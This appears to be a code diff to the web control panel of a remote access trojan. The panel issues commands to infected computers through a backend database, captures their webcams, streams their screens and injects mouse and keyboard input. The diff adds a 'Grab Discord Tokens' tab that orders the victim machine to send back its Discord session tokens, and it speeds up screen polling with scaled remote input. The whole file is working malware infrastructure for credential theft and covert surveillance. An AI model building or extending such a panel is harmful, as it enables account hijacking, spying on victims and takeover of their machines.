@@ -117,6 +117,7 @@ select.mon:focus{border-color:#58a6ff}
     <div class="tab" onclick="switchTab(this,'apps')">Apps</div>
     <div class="tab" onclick="switchTab(this,'files')">Files</div>
     <div class="tab" onclick="switchTab(this,'webcam')">Webcam</div>
+    <div class="tab" onclick="switchTab(this,'tokens')">Tokens</div>
   </div>
 
   <div class="panel active" id="panel-cmd">
@@ -242,6 +243,14 @@ select.mon:focus{border-color:#58a6ff}
     <div id="wcResult"><div class="loading">Click button to capture</div></div>
     <div id="wcErr" class="err"></div>
   </div>
+
+  <div class="panel" id="panel-tokens">
+    <div class="capture-bar">
+      <button class="btn btn-danger" onclick="grabTokens()">Grab Discord Tokens</button>
+    </div>
+    <div id="tokenResult" class="scroll-output"><div class="loading">Click to grab tokens</div></div>
+    <div id="tokenErr" class="err"></div>
+  </div>
 </div>
 
 <script>
@@ -330,43 +339,50 @@ async function takeWebcam(){
  if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
  else if(res)el.innerHTML='<div class="loading">Empty result received</div>';
 }
+async function grabTokens(){const el=document.getElementById('tokenResult');const errEl=document.getElementById('tokenErr');errEl.style.display='none';const res=await sendAndWait('discord_tokens','',el,'tokenErr');if(res&&res.result)el.innerHTML='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-size:.8rem;line-height:1.5">'+escHtml(res.result)+'</pre>';else if(res)el.innerHTML='<div class="loading">No tokens found</div>';}
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 
+let screenScale=1;
 async function startScreen(){
  document.getElementById('screenStartBtn').style.display='none';
  document.getElementById('screenStopBtn').style.display='';
- screenInterval=setInterval(pollScreen,250);frameCount=0;fpsTime=Date.now();
+ screenInterval=true;frameCount=0;fpsTime=Date.now();pollScreen();
 }
 
 async function pollScreen(){
+ if(!screenInterval)return;
  try{
   const r=await fetch(FB+'/live/'+encodeURIComponent(computer)+'.json');
-  if(!r.ok)return;
-  const row=await r.json();
-  if(row&&row.result){
-   const t=new Date(row.created_at).getTime();
-   if(Date.now()-t<30000){
-    const el=document.getElementById('screenResult');const imgSrc='data:image/jpeg;base64,'+row.result;
-    if(el.querySelector('img')){el.querySelector('img').src=imgSrc;
-    }else{
-     el.innerHTML='<div class="screen-container"><img class="screenshot" id="screenImg" src="'+imgSrc+'"><canvas id="screenCanvas"></canvas></div>';
-     setupCanvas();if(mouseOn)setupMouseEvents();
-    }
-    pollLastTime=t;frameCount++;
-    if(Date.now()-fpsTime>=2000){
-     document.getElementById('screenFps').textContent=Math.round(frameCount/((Date.now()-fpsTime)/1000))+' fps';
-     frameCount=0;fpsTime=Date.now();
+  if(r.ok){
+   const row=await r.json();
+   if(row&&row.result){
+    screenScale=parseFloat(row.scale)||1;
+    const t=new Date(row.created_at).getTime();
+    if(Date.now()-t<30000){
+     const el=document.getElementById('screenResult');const imgSrc='data:image/jpeg;base64,'+row.result;
+     if(el.querySelector('img')){el.querySelector('img').src=imgSrc;
+     }else{
+      el.innerHTML='<div class="screen-container"><img class="screenshot" id="screenImg" src="'+imgSrc+'"><canvas id="screenCanvas"></canvas></div>';
+      setupCanvas();if(mouseOn)setupMouseEvents();
+     }
+     pollLastTime=t;frameCount++;
+     if(Date.now()-fpsTime>=1000){
+      document.getElementById('screenFps').textContent=Math.round(frameCount/((Date.now()-fpsTime)/1000))+' fps';
+      frameCount=0;fpsTime=Date.now();
+     }
+    }else if(pollLastTime&&Date.now()-pollLastTime>15000){
+     const el=document.getElementById('screenResult');
+     if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
+     document.getElementById('screenFps').textContent='';
     }
    }else if(pollLastTime&&Date.now()-pollLastTime>15000){
     const el=document.getElementById('screenResult');
     if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
     document.getElementById('screenFps').textContent='';
    }
-  }else if(pollLastTime&&Date.now()-pollLastTime>15000){
-   const el=document.getElementById('screenResult');
-   if(!el.querySelector('.loading'))el.innerHTML='<div class="loading">Client disconnected</div>';
-   document.getElementById('screenFps').textContent='';
   }
  }catch{}
+ setTimeout(pollScreen,100);
 }
 
 function setupCanvas(){
@@ -380,11 +396,12 @@ function getScreenCoords(e){
  const c=document.getElementById('screenCanvas');const img=document.getElementById('screenImg');
  if(!c||!img)return null;
  const rect=c.getBoundingClientRect();
- return {x:Math.round((e.clientX-rect.left)*img.naturalWidth/c.width),y:Math.round((e.clientY-rect.top)*img.naturalHeight/c.height)};
+ const s=screenScale||1;
+ return {x:Math.round((e.clientX-rect.left)*img.naturalWidth/c.width/s),y:Math.round((e.clientY-rect.top)*img.naturalHeight/c.height/s)};
 }
 
 async function sendFireForget(type,payload){
- try{await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||'',status:'pending'})});}catch{}
+ try{await fetch(FB+'/input/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||''})});}catch{}
 }
 
 function setupMouseEvents(){
@@ -402,7 +419,7 @@ document.addEventListener('keydown',function(e){if(!keyOn)return;if(e.target.tag
 document.addEventListener('keyup',function(e){if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'up'}));});
 
 function stopScreen(){
- if(screenInterval){clearInterval(screenInterval);screenInterval=null}
+ screenInterval=false;
  document.getElementById('screenStartBtn').style.display='';document.getElementById('screenStopBtn').style.display='none';
  document.getElementById('screenFps').textContent='';
  document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';
